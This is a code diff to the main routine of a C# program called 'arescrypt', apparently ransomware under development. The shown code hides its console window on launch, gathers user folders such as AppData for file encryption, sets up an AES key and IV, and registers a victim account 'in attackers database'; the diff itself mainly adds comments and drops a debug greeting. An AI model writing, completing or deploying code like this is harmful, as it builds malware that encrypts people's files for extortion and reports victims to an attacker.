@@ -17,25 +17,17 @@ namespace arescrypt
         [STAThread]
         static void Main(string[] args)
         {
-            /*
-            // Welcome message
-            Console.Write("Hello, " + Configuration.userDomUser);
-#if DEBUG
-            Console.Write(". DEBUG mode has been enabled.\n");
-#else
-            Console.Write(". RELEASE mode has been enabled.\n");
-#endif
-            Console.WriteLine("Current path is: " + Configuration.currentWorkingDirectory + "\n");
-            // End welcome message
-            */
-
+            // Hide window upon launch
             if (!config.debugMode)
-                Miscellaneous.HideWindow(); // Hide Window, upon launch
+                Miscellaneous.HideWindow();
 
+            // Preset our variables that will contain the
+            // specified directories and files to encrypt.
             var userSpecificDirs = new List<string> { "" };
             string[] fullFileIndex = { "" };
 
-
+            // Check if sandboxing has been enabled in config
+            // If so, only "encrypt" files in the "sandboxDirectory/" folder
             if (config.sandBox) // == true
                 if (Directory.Exists(config.sandBoxDirectory))
                     userSpecificDirs.Add(config.sandBoxDirectory);
@@ -51,8 +43,8 @@ namespace arescrypt
                 userSpecificDirs.Add(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
             }
             
+            // Preset variables for defining all discovered files
             var userSpecificFiles = new List<string> { };
-            var systemSpecificFiles = new List<string> { };
 
             // Get all files in every directory specified above.
             // Then add to a List<string> (array)
@@ -68,7 +60,7 @@ namespace arescrypt
                 Cryptography.encIV = myAes.IV;
             }
 
-            accountManager.CreateUser(); // Create new user account
+            accountManager.CreateUser(); // Create new user account in attackers database
             
             // Cryptography.executeExample(); // Execute cryptography example
 
